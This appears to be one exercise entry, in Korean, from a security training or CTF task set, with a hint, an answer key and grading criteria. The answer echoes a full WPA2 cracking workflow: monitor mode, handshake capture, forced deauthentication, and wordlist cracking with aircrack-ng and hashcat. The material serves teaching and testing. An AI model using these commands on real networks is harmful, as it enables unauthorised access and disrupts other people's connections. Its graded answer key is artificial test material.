- order: 5
  instruction: aircrack-ng를 사용하여 사전에 준비된 WPA2 핸드셰이크 캡처 파일을 크래킹하라(시뮬레이션).
  hint: aircrack-ng -w wordlist capture.cap 형태이다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: aircrack-ng를 사용하여 사전에 준비된 WPA2 핸드셰이크 캡처 파일을 크래킹하라(시뮬레이션)해줘

    📎 참고 (CLI): echo ''=== WPA2 Cracking Simulation ==='' && echo ''Step 1: Monitor
    mode'' && echo ''  airmon-ng start wlan0'' && echo ''Step 2: Capture handshake''
    && echo ''  airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon'' &&
    echo ''Step 3: Force deauth to trigger handshake'' && echo ''  aireplay-ng -0
    5 -a AA:BB:CC:DD:EE:FF wlan0mon'' && echo ''Step 4: Crack with wordlist'' && echo
    ''  aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap'' && echo ''---''
    && echo ''hashcat GPU crack: hashcat -m 22000 hash.hc22000 rockyou.txt'' && echo
    ''Speed: ~500K passwords/sec (GPU) vs ~2K/sec (CPU)'''
  answer_detail: WPA2 크래킹의 핵심은 4-Way Handshake 캡처와 사전 공격이다. CPU로는 초당 약 2,000개 비밀번호를
    테스트하지만, GPU(hashcat)를 사용하면 초당 50만 개 이상 가능하다. 강력한 비밀번호(12자 이상, 랜덤)는 사실상 크래킹 불가능하다.
  verify:
    type: output_contains
    expect: WPA2 Cracking
    field: stdout
    semantic:
      intent: WPA2-PSK 크래킹 4단계 워크플로 시뮬레이션 — airmon-ng start wlan0 (Monitor 모드) → airodump-ng
        -c 6 --bssid AP -w capture (핸드셰이크 캡처) → aireplay-ng -0 5 -a AP (deauth 강제
        재연결) → aircrack-ng -w rockyou capture-01.cap (dict 크래킹). CPU(2K PMK/s) vs
        GPU hashcat(500K PMK/s) 속도 비교
      success_criteria:
      - 4단계 명령 흐름 (monitor→capture→deauth→crack) 모두 포함
      - aircrack-ng 과 hashcat 둘 다 예시 제시
      - CPU vs GPU 속도 비교 또는 강력한 비밀번호는 크래킹 불가 언급
      acceptable_methods:
      - echo 로 4단계 명령 열거
      - hashcat -m 22000 hash.hc22000 rockyou.txt
      - hcxdumptool 로 PMKID 공격 (신규 기법)
      - John the Ripper wpapsk 모드
      negative_signs:
      - 워크플로 단계 2개 이하
      - deauth 재연결 단계 누락
      - 속도/현실성 언급 없음
  target_vm: attacker
  script: 'echo ''=== WPA2 Cracking Simulation ==='' && echo ''Step 1: Monitor mode''
